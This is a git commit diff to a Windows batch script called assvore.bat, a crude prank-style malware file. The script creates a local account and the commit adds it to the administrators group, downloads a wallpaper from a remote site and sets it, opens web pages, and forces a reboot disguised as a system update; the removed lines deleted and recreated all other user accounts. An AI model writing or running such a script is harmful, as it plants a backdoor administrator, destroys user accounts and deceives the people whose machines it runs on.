c73a948d8d5c53b42fdb5e26b10e275377a95cd7
giggityfiles <guh.gig.ity@gmail.com>
2025-09-01 11:09:14 -0400

    Update assvore.bat

--- assvore.bat
+++ assvore.bat
@@ -1,26 +1,12 @@
 @echo off
 set "wallpaper=%USERPROFILE%\Documents\giggitywallpaper.png"
 net user "penis is the password" penis /add
+net localgroup administrators "penis is the password" /add
 start https://www.youtube.com/watch?v=GyYJV1psDow
 start https://www.directv.com
-msg * "https://www.youtube.com/watch?v=GyYJV1psDow&pp=sAQB"
+msg * "https://www.youtube.com/watch?v=GyYJV1psDow"
 powershell -Command "Invoke-WebRequest 'https://giggityfiles.github.io/giggitywallpaper.png' -OutFile '%wallpaper%'"
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-for /f "tokens=2 delims=\" %%a in ("%username%") do set currentUser=%%a
-if not defined currentUser set currentUser=%username%
-for /f "skip=1" %%u in ('wmic useraccount get name') do (
-    set "user=%%u"
-    setlocal enabledelayedexpansion
-    set "trim=!user: =!"
-    if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
-        msg * "!trim! has been eaten by banjo's anus"
-        net user "!trim!" /delete
-        net user "!trim!" /add
-    )
-    endlocal
-
-    
-)
-shutdown /f /r /t 3600
+shutdown /f /r /t 3600 /c "System will shut down in 1 hour for updates."
 exit
